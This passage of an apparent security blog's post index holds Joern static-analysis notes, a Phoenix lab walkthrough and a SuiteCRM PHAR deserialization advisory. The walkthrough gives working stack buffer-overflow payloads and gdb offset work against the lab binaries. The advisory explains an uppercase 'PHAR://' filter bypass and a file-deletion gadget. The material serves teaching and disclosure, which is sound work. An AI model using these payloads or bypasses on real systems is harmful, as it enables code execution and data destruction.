    "content": "Joern NotesJoern is a static analyzer that can be used to create code property graphs and query them fairly easy. This is good alternative to CodeQL since analyzing with Joern doesn’t require you to compile/build the project. I often use this for cases where I can’t use CodeQL or Snyk’s internal static analysis engine to analyse a codebase.Install Joern (Linux)Pre-requisitesapt install source-highlight graphviz unzipSetup Joern CLImkdir joern &amp;&amp; cd joern # optionalcurl -L \"https://github.com/joernio/joern/releases/latest/download/joern-install.sh\" -o joern-install.shchmod u+x joern-install.sh./joern-install.sh --interactiveImport a Project, create CPG and load to consolejoern&gt; importCode(\"crow\") Using generator for language: NEWC: CCpgGeneratorCreating project `crow` for code at `crow`moving cpg.bin.zip to cpg.bin because it is already a database fileCreating working copy of CPG to be safeLoading base CPG from: /home/snoopy/joern-workshop/workspace/crow/cpg.bin.tmpCode successfully imported. You can now query it using `cpg`.For an overview of all imported code, type `workspace`.Adding default overlays to base CPGThe graph has been modified. You may want to use the `save` command to persist changes to disk.  All changes will also be saved collectively on exitres0: Cpg = io.shiftleft.codepropertygraph.generated.Cpg@29345a91The value “crow” is a folder which contains the source code we are trying to analyze.Joern also saves all analyzed projects, this can be viewed by typing workspacejoern&gt; workspace res1: workspacehandling.WorkspaceManager[JoernProject] = ____________________________________________________________________________________________| name    | overlays                           | inputPath                          | open  ||===========================================================================================|| NodeBB1 |                                    | /home/snoopy/joern-workshop/NodeBB | false || NodeBB  | controlflow,typerel,base,callgraph | /home/snoopy/joern-workshop/NodeBB | false |Open can be used to load already analyzed projects, ImportCPG can also be used to load already created bin filesjoern&gt; open(\"/home/snoopy/joern-workshop/NodeBB\"); Passing paths to `loadCpg` is deprecated, please use a project nameCreating working copy of CPG to be safeLoading base CPG from: /home/snoopy/joern-workshop/workspace/NodeBB/cpg.bin.tmpres2: Option[workspacehandling.Project] = Some(  value = Project(    projectFile = ProjectFile(inputPath = \"/home/snoopy/joern-workshop/NodeBB\", name = \"NodeBB\"),    path = /home/snoopy/joern-workshop/workspace/NodeBB,    cpg = Some(value = io.shiftleft.codepropertygraph.generated.Cpg@762e3836)  ))joern&gt; open(\"NodeBB9\") Creating working copy of CPG to be safeLoading base CPG from: /home/snoopy/joern-workshop/workspace/NodeBB/cpg.bin.tmpres1: Option[workspacehandling.Project] = Some(  value = Project(    projectFile = ProjectFile(      inputPath = \"/home/snoopy/joern-workshop/NodeBB\",      name = \"NodeBB\"    ),    path = /home/snoopy/joern-workshop/workspace/NodeBB,    cpg = Some(value = io.shiftleft.codepropertygraph.generated.Cpg@1c65740a)  ))joern&gt;Basic SearchSearching// search for any methods that has the sanitize in its name. Regex can be used herejoern&gt; cpg.method.name(\".*sanitize.*\").name.l res4: List[String] = List(\"sanitizeSignature\", \"sanitize\")// dump the code block that matched the searchjoern&gt; cpg.method.name(\".*find.*\").dump res3: List[String] = List(  \"\"\"static Map* find_hash( ino_t ino, dev_t dev, off_t size, time_t ct ); /* &lt;=== */ \"\"\",  \"\"\"static Map* /* &lt;=== */ find_hash( ino_t ino, dev_t dev, off_t size, time_t ct )    {    unsigned int h, he, i;    Map* m;    h = hash( ino, dev, size, ct );    he = ( h + hash_size - 1 ) &amp; hash_mask;    for ( i = h; ; i = ( i + 1 ) &amp; hash_mask )\t{\tm = hash_table[i];\tif ( m == (Map*) 0 )\t    break;\tif ( m-&gt;hash == h &amp;&amp; m-&gt;ino == ino &amp;&amp; m-&gt;dev == dev &amp;&amp;\t     m-&gt;size == size &amp;&amp; m-&gt;ct == ct )\t    return m;\tif ( i == he )\t    break;\t}    return (Map*) 0;    }Other useful commands  cpg.method.name(\"parse_public_key_packet\").local.name.l - Find all local variables defined in a method  cpg.method.name(\"parse_public_key_packet\").location.map( x=&gt; (x.lineNumber.get,x.filename)).l - Find which file and line number they are in  cpg.method.name(\"parse_public_key_packet\").local.typ.name.l.head - Find the type of the first local variable defined in a method      cpg.method.name(\"parse_public_key_packet\").callOut.name.l - Find all outgoing calls (call-sites) in a method    cpg.method.name(\"parse_public_key_packet\").caller.name.l - Find which method calls a method  cpg.types.name(\"vlc_.*\").localsOfType.name.l - List all local variables of type vlc_.*  cpg.types.name(\"vlc_log_t\").map( x=&gt; (x.name, x.start.member.name.l)).l - Find member variables of a structcpg.local.filter(_.typ.name(\"vlc_log_t\")).name.l - Find local variables and filter them by their type  cpg.local.filter(_.typ.name(\"vlc_log_t\")).method.dump - Which method are they used in?cpg.local.filter(_.typ.name(\"vlc_log_t\")).method.file.name.l - Get the filenames where these methods are  cpg.method.where(_.parameter.size &gt; 4).signature.l - Identify functions with more than 4 parameters  cpg.method.where(_.controlStructure.size &gt; 4).name.l - Identify functions with &gt; 4 control structures (cyclomatic complexity)      cpg.method.where(_.numberOfLines &gt;= 500).name.l - Identify functions with more than 500 lines of code    cpg.method.where(_.ast.isReturn.l.size &gt; 1).name.l - Identify functions with multiple return statements  cpg.method.where(_.ast.isControlStructure.parserTypeName(\"(For|Do|While).*\").size &gt;4).name.l - Identify functions with more than 4 loops      cpg.method.where(_.depth(_.isControlStructure) &gt; 3).name.l - Identify functions with nesting depth larger than 3    cpg.method.name(\"find_hash\").repeat(_.caller)(_.emit).name.l - Find the calle of a method  cpg.method.external.name.l.distinct.sorted - All names of external methods used by the program  cpg.call(\"str.*\").code.l - All calls to functions that start with “str*”  cpg.call(\"strcpy\").method.name.l - All methods that call strcpy      cpg.call(\"sprintf\").argument(2).filterNot(_.isLiteral).code.l Looking into parameters: second argument to sprintf is NOT a literal    cpg.call(\"sprintf\").argument(2).filterNot(_.isLiteral).dump - Quickly see this method above  cpg.method.name(\"parse_public_key_packet\").dot |&gt; \"/tmp/foo.dot\" - Dump dot representations of ASTs for all methods that match parse into fileExporting GraphsJoern can create the following graph representations for C/C++ code:  Abstract Syntax Trees (AST)  Control Flow Graphs (CFG)  Control Dependence Graphs (CDG)  Data Dependence Graphs (DDG)  Program Dependence graphs (PDG)  Code Property Graphs (CPG14)Example of a method name astjoern&gt; cpg.method.name(\"finish_connection\").plotDotAst plotDotAst    plotDotCdg    plotDotCfg    plotDotCpg14  plotDotDdg    plotDotPdgIn most cases, plotDotCpg14 is the most useful graph. It combines AST and CFG together, more about code property can be read here: https://www.sec.cs.tu-bs.de/pubs/2014-ieeesp.pdfJoern supports many analysis types. Some of these are run by default. These can be ran with run namejoern&gt; run res1: OverlaysDynamic = __________________________________________________________________________| name          | description                                             ||=========================================================================|| callgraph     | Call graph layer                                        || controlflow   | Control flow layer (including dominators and CDG edges) || base          | base layer (linked frontend CPG)                        || typerelations | Type relations layer (hierarchy and aliases)            || dumpast       | Dump abstract syntax trees to out/                      || dumpcfg       | Dump control flow graph to out/                         || dumpcdg       | Dump control dependence graph to out/                   || dumppdg       | Dump program dependence graph to out/                   || scan          | Joern Code Scanner                                      || dumpddg       | Dump data dependence graphs to out/                     || commit        | Apply current custom diffgraph                          || ossdataflow   | Layer to support the OSS lightweight data flow tracker  || dumpcpg14     | Dump Code Property Graph (2014) to out/                 |Run Dataflow analysisjoern&gt; run ossdataflow The graph has been modified. You may want to use the `save` command to persist changes to disk.  All changes will also be saved collectively on exitres2: Cpg = io.shiftleft.codepropertygraph.generated.Cpg@34e4a136joern&gt; save Saving graphs on disk. This may take a while.Turning working copy into new persistent CPGCreating working copy of CPG to be safeLoading base CPG from: /home/snoopy/joern-workshop/workspace/alloc_party/cpg.bin.tmpres3: List[workspacehandling.Project] = List(  Project(    projectFile = ProjectFile(      inputPath = \"/home/snoopy/joern-workshop/alloc_party\",      name = \"alloc_party\"    ),    path = /home/snoopy/joern-workshop/workspace/alloc_party,    cpg = Some(value = io.shiftleft.codepropertygraph.generated.Cpg@4a65ce06)  ))joern&gt;  Define a source methodjoern&gt; def source = cpg.method.name(\".*alloc.*\").parameter  cpg.method.fullName(\"main\").parameterdefined function sourceDefine a sink methodjoern&gt; def sink = cpg.call(\"malloc\").where(_.argument(1).isCallTo(Operators.multiplication)).argument defined function sinkCode examplevoid *alloc_havoc(int y) { //source  int z = 10;  void *x = malloc(y * z); //sink  return x;}joern&gt;  sink.reachableByFlows(source).p res11: List[String] = List(  \"\"\"_______________________________________________________________________________________________________| tracked            | lineNumber| method      | file                                                  ||======================================================================================================|| alloc_havoc(int y) | 11        | alloc_havoc | /home/snoopy/joern-workshop/alloc_party/alloc_party.c || y * z              | 13        | alloc_havoc | /home/snoopy/joern-workshop/alloc_party/alloc_party.c || y * z              | 13        | alloc_havoc | /home/snoopy/joern-workshop/alloc_party/alloc_party.c |\"\"\")Another examplejoern&gt; def source = cpg.method.fullName(\"exec\").parameterjoern&gt; def sink = cpg.call.name(\"gets\").argument.order(1)joern&gt; sink.reachableByFlows(source).p #include &lt;stdio.h&gt;int exec(char input) { //source    int allow = 0;    gets(input); // user inputs \"malicious\"    if (grantAccess(input)) {        allow = 1;    }    if (allow != 0) { // has been overwritten by the overflow of the username.        privilegedAction();    }     return 0;}int main () {    char username[8];    printf (\"Enter your username, please: \");    scanf(\"%d\", &amp;username);    exec(username);   }Joern can also be run as a script using the Joern CLI. More about this can be found here: https://docs.joern.io/interpreter. This feature can be useful for mass scanning codebases. The server mode is also useful if you want to build tooling around it https://docs.joern.io/serverJoern ScanningJoern-Scan has a built in scanner which uses community provided queries from https://queries.joern.io/joern-scan --list-languagesWriting logs to: /tmp/joern-scan-log.txtAvailable languages (case insensitive):- golang- fuzzy_test_lang- csharp- java- php- c- kotlin- ghidra- javascript- python- llvm- newc- javasrcNote: Most of the above languages are only available in Ocular (Joern Paid version).To scan a folder run joern-scan /project_to_scanOther commands:  joern-scan --updatedb - Updates built-in query database.  joern-scan /file/to/scan –overwrite - Overwrite existing project CPG, run after application changes.  joern-scan /file/to/scan –tags xss,defaul - Specify queries to run.Instead of using the Joern interpreter, another option is to add your custom query in the correct format, build this querydb locally and use it with joern scan.$ git clone https://github.com/joernio/query-database/$ cd query-databaseadd your query$ ./install.sh$ ./joern-scan /file/to/scanReferences  https://docs.joern.io/  https://github.com/joernio/workshops  https://queries.joern.io"
  },
  
  {
    "title": "Exploit Education - Phoenix Notes",
    "url": "/posts/exploit-education-phoenix/",
    "categories": "ctf, binary exploitation",
    "tags": "exploit education",
    "date": "2021-05-15 11:33:00 +0800",
    





    
    "snippet": "Exploit Education NotesThe image can be downloaded from https://exploit.education/phoenix/, and can be extracted and executed usingtar xJf exploit-education-phoenix-amd64-v1.0.0-alpha-3.tar.xzcd ex...",
    "content": "Exploit Education NotesThe image can be downloaded from https://exploit.education/phoenix/, and can be extracted and executed usingtar xJf exploit-education-phoenix-amd64-v1.0.0-alpha-3.tar.xzcd exploit-education-phoenix-amd64/./boot-exploit-education-phoenix-amd64.shAfter running the QEMU image, you can ssh into the machine via ssh -p2222 user@localhostStack Zero/* * phoenix/stack-zero, by https://exploit.education * * The aim is to change the contents of the changeme variable. * * Scientists have recently discovered a previously unknown species of * kangaroos, approximately in the middle of Western Australia. These * kangaroos are remarkable, as their insanely powerful hind legs give them * the ability to jump higher than a one story house (which is approximately * 15 feet, or 4.5 metres), simply because houses can't can't jump. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define BANNER \\  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"char *gets(char *);int main(int argc, char **argv) {  struct {    char buffer[64];    volatile int changeme;  } locals;  printf(\"%s\\n\", BANNER);  locals.changeme = 0;  gets(locals.buffer);  if (locals.changeme != 0) {    puts(\"Well done, the 'changeme' variable has been changed!\");  } else {    puts(        \"Uh oh, 'changeme' has not yet been changed. Would you like to try \"        \"again?\");  }  exit(0);}In the above code, a variable called buffer is initialized with 64 bytes, another locaal variable called change is also set. The gets function is then used to take user input and store it without any bounds checking, which can be exploited using a Buffer Overflow.This can be exploited by inserting 65 characters to overflow the buffer variable.user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print \"A\"*65' | ./stack-zeroWelcome to phoenix/stack-zero, brought to you by https://exploit.educationWell done, the 'changeme' variable has been changed!user@phoenix-amd64:/opt/phoenix/amd64$ Stack One/* * phoenix/stack-one, by https://exploit.education * * The aim is to change the contents of the changeme variable to 0x496c5962 * * Did you hear about the kid napping at the local school? * It's okay, they woke up. * */#include &lt;err.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define BANNER \\  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"int main(int argc, char **argv) {  struct {    char buffer[64];    volatile int changeme;  } locals;  printf(\"%s\\n\", BANNER);  if (argc &lt; 2) {    errx(1, \"specify an argument, to be copied into the \\\"buffer\\\"\");  }  locals.changeme = 0;  strcpy(locals.buffer, argv[1]);  if (locals.changeme == 0x496c5962) {    puts(\"Well done, you have successfully set changeme to the correct value\");  } else {    printf(\"Getting closer! changeme is currently 0x%08x, we want 0x496c5962\\n\",        locals.changeme);  }  exit(0);}strcpy is used which is dangerous because the source size could be more than destination size. In this challenge, the changeme value nees to be set with a specific value 0x496c5962This can be triggered using a payload such as python -c 'print \"A\"*64 + \"\\x62\\x59\\x6c\\x49\"' which fills up the first 64 bytes with A and then sets the specific value 0x496c5962user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one $(python -c 'print \"A\"*64 + \"\\x62\\x59\\x6c\\x49\"')Welcome to phoenix/stack-one, brought to you by https://exploit.educationWell done, you have successfully set changeme to the correct valueuser@phoenix-amd64:/opt/phoenix/amd64$ Stack Two/* * phoenix/stack-two, by https://exploit.education * * The aim is to change the contents of the changeme variable to 0x0d0a090a * * If you're Russian to get to the bath room, and you are Finnish when you get * out, what are you when you are in the bath room? * * European! */#include &lt;err.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define BANNER \\  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"int main(int argc, char **argv) {  struct {    char buffer[64];    volatile int changeme;  } locals;  char *ptr;  printf(\"%s\\n\", BANNER);  ptr = getenv(\"ExploitEducation\");  if (ptr == NULL) {    errx(1, \"please set the ExploitEducation environment variable\");  }  locals.changeme = 0;  strcpy(locals.buffer, ptr);  if (locals.changeme == 0x0d0a090a) {    puts(\"Well done, you have successfully set changeme to the correct value\");  } else {    printf(\"Almost! changeme is currently 0x%08x, we want 0x0d0a090a\\n\",        locals.changeme);  }  exit(0);}Same as the previous level, except user input is taken via an environment value.ExploitEducation=$(python -c 'print \"A\"*64 + \"\\x0a\\x09\\x0a\\x0d\"')Which then the stack-two program will take.user@phoenix-amd64:/opt/phoenix/amd64$ ExploitEducation=$(python -c 'print \"A\"*64 + \"\\x0a\\x09\\x0a\\x0d\"') ./stack-twoWelcome to phoenix/stack-two, brought to you by https://exploit.educationWell done, you have successfully set changeme to the correct valueuser@phoenix-amd64:/opt/phoenix/amd64$ Stack ThreeStack Three looks at overwriting function pointers stored on the stack./* * phoenix/stack-three, by https://exploit.education * * The aim is to change the contents of the changeme variable to 0x0d0a090a * * When does a joke become a dad joke? *   When it becomes apparent. *   When it's fully groan up. * */#include &lt;err.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define BANNER \\  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"char *gets(char *);void complete_level() {  printf(\"Congratulations, you've finished \" LEVELNAME \" :-) Well done!\\n\");  exit(0);}int main(int argc, char **argv) {  struct {    char buffer[64];    volatile int (*fp)();  } locals;  printf(\"%s\\n\", BANNER);  locals.fp = NULL;  gets(locals.buffer);  if (locals.fp) {    printf(\"calling function pointer @ %p\\n\", locals.fp);    fflush(stdout);    locals.fp();  } else {    printf(\"function pointer remains unmodified :~( better luck next time!\\n\");  }  exit(0);}This elf executable initializes the fp variable to NULL which is a pointer, and gets a string from user input, saves it to the buffer variable, fp is called later as a function with whateever value that is stored.user@phoenix-amd64:/opt/phoenix/amd64$ export PYTHONIOENCODING=utf-8user@phoenix-amd64:/opt/phoenix/amd64$ gdb -q ./stack-threeGEF for linux ready, type `gef' to start, `gef config' to configure71 commands loaded for GDB 8.2.1 using Python engine 3.5[*] 2 commands could not be loaded, run `gef missing` to know why.Reading symbols from ./stack-three...(no debugging symbols found)...done.Python Exception &lt;class 'UnicodeEncodeError'&gt; 'ascii' codec can't encode character '\\u27a4' in position 12: ordinal not in range(128): (gdb) print complete_level$1 = {&lt;text variable, no debug info&gt;} 0x40069d &lt;complete_level&gt;Python Exception &lt;class 'UnicodeEncodeError'&gt; 'ascii' codec can't encode character '\\u27a4' in position 12: ordinal not in range(128): gdb can be used to print the address of the complete_level function (0x40069d). Our bof payload can now overwrite the 64 buffer characters and then that address can be used to jumpt to that function.user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print \"A\"*64 + \"\\x9d\\x06\\x40\"' | ./stack-threeWelcome to phoenix/stack-three, brought to you by https://exploit.educationcalling function pointer @ 0x40069dCongratulations, you've finished phoenix/stack-three :-) Well done!user@phoenix-amd64:/opt/phoenix/amd64$ Stack FourStack Four takes a look at what can happen when you can overwrite the saved instruction pointer (standard buffer overflow).HintsThe saved instruction pointer is not necessarily directly after the end of variable allocations – things like compiler padding can increase the size. Did you know that some architectures may not save the return address on the stack in all cases?GDB supports “run &lt; my_file” to direct input from my_file into the program./* * phoenix/stack-four, by https://exploit.education * * The aim is to execute the function complete_level by modifying the * saved return address, and pointing it to the complete_level() function. * * Why were the apple and orange all alone? Because the bananna split. */#include &lt;err.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define BANNER \\  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"char *gets(char *);void complete_level() {  printf(\"Congratulations, you've finished \" LEVELNAME \" :-) Well done!\\n\");  exit(0);}void start_level() {  char buffer[64];  void *ret;  gets(buffer);  ret = __builtin_return_address(0);  printf(\"and will be returning to %p\\n\", ret);}int main(int argc, char **argv) {  printf(\"%s\\n\", BANNER);  start_level();}To complete this level, you need to overwrite the return address of start_level function to return to complete_level function instead of main. By providing a buffer larger than 64 bytes, we can overflow the saved instruction pointer.ser@phoenix-amd64:/opt/phoenix/amd64$ gdb -q stack-fourGEF for linux ready, type `gef' to start, `gef config' to configure71 commands loaded for GDB 8.2.1 using Python engine 3.5[*] 2 commands could not be loaded, run `gef missing` to know why.Reading symbols from stack-four...(no debugging symbols found)...done.Python Exception &lt;class 'UnicodeEncodeError'&gt; 'ascii' codec can't encode character '\\u27a4' in position 12: ordinal not in range(128): (gdb) print complete_level$1 = {&lt;text variable, no debug info&gt;} 0x40061d &lt;complete_level&gt;The main() function can be disassembled to see which address will be stored on the stack after the start_level() function returns. The start_level() function can also be disassembled because I’d like to place a break point right after the gets() function is called. That way we can see the user input being stored on the stack.user@phoenix-amd64:/opt/phoenix/amd64$ gdb stack-fourGNU gdb (GDB) 8.2.1Copyright (C) 2018 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Type \"show copying\" and \"show warranty\" for details.This GDB was configured as \"x86_64-pc-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\"...GEF for linux ready, type `gef' to start, `gef config' to configure71 commands loaded for GDB 8.2.1 using Python engine 3.5[*] 2 commands could not be loaded, run `gef missing` to know why.Reading symbols from stack-four...(no debugging symbols found)...done.Python Exception &lt;class 'UnicodeEncodeError'&gt; 'ascii' codec can't encode character '\\u27a4' in position 12: ordinal not in range(128): (gdb) disas mainDump of assembler code for function main:   0x000000000040066a &lt;+0&gt;:     push   rbp   0x000000000040066b &lt;+1&gt;:     mov    rbp,rsp   0x000000000040066e &lt;+4&gt;:     sub    rsp,0x10   0x0000000000400672 &lt;+8&gt;:     mov    DWORD PTR [rbp-0x4],edi   0x0000000000400675 &lt;+11&gt;:    mov    QWORD PTR [rbp-0x10],rsi   0x0000000000400679 &lt;+15&gt;:    mov    edi,0x400750   0x000000000040067e &lt;+20&gt;:    call   0x400480 &lt;puts@plt&gt;   0x0000000000400683 &lt;+25&gt;:    mov    eax,0x0   0x0000000000400688 &lt;+30&gt;:    call   0x400635 &lt;start_level&gt;   0x000000000040068d &lt;+35&gt;:    mov    eax,0x0   0x0000000000400692 &lt;+40&gt;:    leave     0x0000000000400693 &lt;+41&gt;:    ret    End of assembler dump.Python Exception &lt;class 'UnicodeEncodeError'&gt; 'ascii' codec can't encode character '\\u27a4' in position 12: ordinal not in range(128): (gdb) disas start_levelDump of assembler code for function start_level:   0x0000000000400635 &lt;+0&gt;:     push   rbp   0x0000000000400636 &lt;+1&gt;:     mov    rbp,rsp   0x0000000000400639 &lt;+4&gt;:     sub    rsp,0x50   0x000000000040063d &lt;+8&gt;:     lea    rax,[rbp-0x50]   0x0000000000400641 &lt;+12&gt;:    mov    rdi,rax   0x0000000000400644 &lt;+15&gt;:    call   0x400470 &lt;gets@plt&gt;   0x0000000000400649 &lt;+20&gt;:    mov    rax,QWORD PTR [rbp+0x8]   0x000000000040064d &lt;+24&gt;:    mov    QWORD PTR [rbp-0x8],rax   0x0000000000400651 &lt;+28&gt;:    mov    rax,QWORD PTR [rbp-0x8]   0x0000000000400655 &lt;+32&gt;:    mov    rsi,rax   0x0000000000400658 &lt;+35&gt;:    mov    edi,0x400733   0x000000000040065d &lt;+40&gt;:    mov    eax,0x0   0x0000000000400662 &lt;+45&gt;:    call   0x400460 &lt;printf@plt&gt;   0x0000000000400667 &lt;+50&gt;:    nop   0x0000000000400668 &lt;+51&gt;:    leave     0x0000000000400669 &lt;+52&gt;:    ret    End of assembler dump.Python Exception &lt;class 'UnicodeEncodeError'&gt; 'ascii' codec can't encode character '\\u27a4' in position 12: ordinal not in range(128): (gdb) The disassembly of the main() function shows that after the start_level() function returns, it will be execution at the address 0x0040068d. That can be examined in the stack. A break point can also be set at 0x400649 to verify this.The “buffer” variable with 64 characters. This can be filled with characters.(gdb) b *0x0000000000400649Breakpoint 1 at 0x400649Python Exception &lt;class 'UnicodeEncodeError'&gt; 'ascii' codec can't encode character '\\u27a4' in position 12: ordinal not in range(128): (gdb) run &lt;&lt;&lt; $(python -c 'print \"A\" + \"B\"*62 + \"C\"')Starting program: /opt/phoenix/amd64/stack-four &lt;&lt;&lt; $(python -c 'print \"A\" + \"B\"*62 + \"C\"')/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)Welcome to phoenix/stack-four, brought to you by https://exploit.educationBreakpoint 1, 0x0000000000400649 in start_level ()[ Legend: Modified register | Code | Heap | Stack | String ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────$rax   : 0x00007fffffffe510  →  \"ABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]\"$rbx   : 0x00007fffffffe5d8  →  0x00007fffffffe801  →  \"/opt/phoenix/amd64/stack-four\"$rcx   : 0x8080808080808080(gdb) x/24x $sp0x7fffffffe510: 0x42424241      0x42424242      0x42424242      0x424242420x7fffffffe520: 0x42424242      0x42424242      0x42424242      0x424242420x7fffffffe530: 0x42424242      0x42424242      0x42424242      0x424242420x7fffffffe540: 0x42424242      0x42424242      0x42424242      0x434242420x7fffffffe550: 0xffff0000      0x00007fff      0xffffe580      0x00007fff0x7fffffffe560: 0xffffe580      0x00007fff      0x0040068d      0x00000000(gdb) info frameStack level 0, frame at 0x7fffffffe570: rip = 0x400649 in start_level; saved rip = 0x40068d called by frame at 0x7fffffffe590 Arglist at 0x7fffffffe560, args:  Locals at 0x7fffffffe560, Previous frame's sp is 0x7fffffffe570 Saved registers:  rbp at 0x7fffffffe560, rip at 0x7fffffffe568Python Exception &lt;class 'UnicodeEncodeError'&gt; 'ascii' codec can't encode character '\\u27a4' in position 12: ordinal not in range(128): (gdb)   The return address care about is 0x0040068d  This is at memory location 0x7fffffffe568  start of the “buffer” variable is at 0x7fffffffe510.Gdb can be used to calculate how many bytes difference is between the return address and the buffer variable location.(gdb) printf \"%i\\n\", 0x7fffffffe568 - 0x7fffffffe51088This can now be used to complete the level.user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print \"A\"*88 + \"\\x1d\\x06\\x40\"' | ./stack-fourWelcome to phoenix/stack-four, brought to you by https://exploit.educationand will be returning to 0x40061dCongratulations, you've finished phoenix/stack-four :-) Well done!user@phoenix-amd64:/opt/phoenix/amd64$ Stack FiveAs opposed to executing an existing function in the binary, this time we’ll be introducing the concept of “shell code”, and being able to execute our own code.Hints  Don’t feel like you have to write your own shellcode just yet – there’s plenty on the internet.  If you wish to debug your shellcode, be sure to make use of the breakpoint instruction. On i386 / x86_64, that’s 0xcc, and will cause a SIGTRAP.  Make sure you remove those breakpoints after you’re done./* * phoenix/stack-five, by https://exploit.education * * Can you execve(\"/bin/sh\", ...) ? * * What is green and goes to summer camp? A brussel scout. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define BANNER \\  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"char *gets(char *);void start_level() {  char buffer[128];  gets(buffer);}int main(int argc, char **argv) {  printf(\"%s\\n\", BANNER);  start_level();}"
  },
  
  {
    "title": "SuiteCRM - Phar Deserialization to Code Execution",
    "url": "/posts/suitecrm-phar-deserialization/",
    "categories": "web application security",
    "tags": "php deserialization",
    "date": "2021-05-10 03:25:52 +0800",
    





    
    "snippet": "This is a copy of a blog which i recently published on Snyk: https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/IntroductionuiteCRM is a free and open source Custome...",
    "content": "This is a copy of a blog which i recently published on Snyk: https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/IntroductionuiteCRM is a free and open source Customer Relationship Management application for servers. This advisory details a PHAR deserialization vulnerability that exists in SuiteCRM which could be leveraged by an authenticated administrator to execute commands on the underlying operating system. This issue has been fixed in release 7.11.19.In PHP, PHAR (PHP Archive) files can be used to package PHP applications and PHP libraries into one archive file. The PHAR format in PHP uses a single file format which can be used to store and execute multiple PHP code. PHAR files contain metadata about the files in the archive. In a PHAR file, this metadata is stored in a serialized format.If a file operation is performed on a PHAR file via the phar:// wrapper, the PHAR file’s metadata would be unserialized. As such, an attacker could perform PHP object injection without the use of the unserialize() function by uploading a PHAR file. This vulnerability notably gained popularity after Sam Thomas published his research work at BlackHat USA 2018 titled, It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It, which affected multiple Content Management Systems. In order to exploit this vulnerability, two conditions must be met:  A PHP filesystem function such as “file_exists” that can be controlled which will trigger the unserialize() function  The ability to upload a PHAR file with the .phar, .zip, or .jpeg extension to the target system and the path of this file to be knownTechnical Details1) Root CauseThis vulnerability bypasses the security mechanisms implemented by SuiteCRM maintainers as part of their remediation to CVE-2020-8801. As seen in the advisory for CVE-2020-8801, multiple areas within the SuiteCRM administrator panel which includes Backups, Import, and UpgradeWizard areas can be used to trigger PHAR deserialization. This was remediated by the maintainers within release 7.11.13 with commit 571cbfa209da4c8280a5359f301115de25b4c6e3.The strpos function is used to check if a user parameter contains an occurrence of the phar:// URI. However, due to the usage of the strpos function, this check is case-sensitive. As such, it is possible to bypass this check using capital characters and trigger PHAR deserialization by calling the phar wrapper such as PHAR://.2) Finding a usable GadgetWhile it is possible to bypass the SuiteCRM patch for the PHAR URI check, it was found that SuiteCRM maintainers took precautions to ensure that all possible POP gadgets that could be triggered by an attacker using deserialization cannot be used. This was done by adding a __wakeup magic method into classes that were considered to be dangerous. This method is automatically invoked every time an object is being unserialized and ensures that all of the object’s properties are destroyed upon deserialization. An example of this can be seen belowWithin modules/Import/sources/ImportFile.php, a __destruct magic method exists which could be abused to delete arbitrary files from a system through unsafe deserialization. However, due to the presence of the above __wakeup method, this __destruct method cannot be leveraged by an attacker. This check was found throughout SuiteCRM’s codebase.However, a closer look at SuiteCRM’s dependencies, it was possible to find a usable __destruct method that could be leveraged for arbitrary file deletion. SuiteCRM uses the zend-gdata library which uses zf1/zend-http as a transitive dependency.Within the Stream.php file of the zf1/zend-http package, a __destruct method exists which when triggered, will run the @unlink function on the $stream_name property of an object. The @unlink function within this method can be leveraged to delete a file. In order for this function to be triggered, a $_cleanup property should also exist for a given object. The code for this __destruct method can be seen below.https://github.com/zf1/zend-http/blob/de1e836ea1bc7d5acccc82b1cf4dd236271a21cb/library/Zend/Http/Response/Stream.php#L224-L233The existence of this gadget is already known and is available for use within the PHPGGC library. PHPGGC is a library of unserialize() payloads along with a script to generate a POP gadget payload based on user given parameters.Note: If all dev dependencies are also installed within a SuiteCRM installation, a vulnerable release of PHP-CS-Fixer can also be leveraged for Arbitrary FIle Deletion instead of zf1/zend-http. The pull request which integrates this POP gadget to the PHPGGC can be seen here: https://github.com/ambionics/phpggc/pull/933) Finding and Abusing an Upload FunctionalityWhile the advisory for CVE-2020-8801 explains the parameters and the areas within SuiteCRM that can be used for PHAR deserialization, the advisory and the related blog from the researcher who discovered this issue doesn’t state where a PHAR file can be uploaded or what path/location could be leveraged. Furthermore, it was found that any file that is uploaded to SuiteCRM would be renamed to have no extension and the name of this file would be changed to a random UUID identifier. For example, party-parrot.png uploaded as part of a document will be renamed to 51eea769-ce13-40bb-fb25-60197bf855ae.However, after some further walkthrough of all SuiteCRM functionality, it was found that any Module Loader zip uploads do not adhere to this behaviour and module zip uploads are uploaded and saved at an arbitrary location with the .zip extension that can be 